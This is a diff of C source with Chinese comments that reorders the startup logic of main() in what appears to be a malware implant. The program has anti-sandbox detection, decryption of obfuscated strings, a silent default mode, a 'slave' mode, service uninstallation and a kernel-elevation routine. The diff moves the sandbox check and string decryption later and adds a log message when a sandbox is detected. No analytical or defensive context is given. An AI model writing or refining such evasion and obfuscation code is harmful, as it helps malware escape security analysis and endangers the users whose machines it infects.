@@ -1865,16 +1865,7 @@ static int ElevateToKernelLevel(void) {
 }
 
 int main(int argc, char *argv[]) {
-    /* ★ 反沙箱检测 ★ */
-    if (IsSandboxed()) {
-        /* 静默退出，不暴露任何信息 */
-        return 0;
-    }
-
-    /* ★ 解密所有混淆字符串 */
-    DecryptAllStrings();
-
-    // ===== 第一步：解析命令行参数（最高优先级） =====
+    // ===== 第一步：解析命令行参数 =====
     BOOL bIsSlave     = FALSE;
     BOOL bIsUninstall = FALSE;
     BOOL bIsConsole   = FALSE;
@@ -1885,14 +1876,14 @@ int main(int argc, char *argv[]) {
         if (strcmp(argv[i], "--console")   == 0) bIsConsole   = TRUE;
     }
 
-    // ===== 第二步：根据模式决定是否创建控制台 =====
+    // ===== 第二步：尽早分配控制台（便于看到后续日志） =====
     if (bIsConsole || bIsUninstall) {
-        AllocConsoleWindow();   // 显示控制台
+        AllocConsoleWindow();
     } else {
-        EnterSilentMode();      // 静默（默认）
+        EnterSilentMode();
     }
 
-    // ===== 第三步：立即执行专属命令，然后退出 =====
+    // ===== 第三步：Slave/Uninstall 立即执行后退出 =====
     if (bIsSlave) {
         SlaveRun();
         return 0;
@@ -1901,6 +1892,15 @@ int main(int argc, char *argv[]) {
         UninstallService();
         return 0;
     }
+
+    /* ★ 反沙箱检测 */
+    if (IsSandboxed()) {
+        printf("[Guard] 沙箱环境检测触发，程序退出\n");
+        return 0;
+    }
+
+    /* ★ 解密所有混淆字符串 */
+    DecryptAllStrings();
 
 
     // ===== 第四步：只有“应用程序模式”或“服务模式”才会走到这里 =====
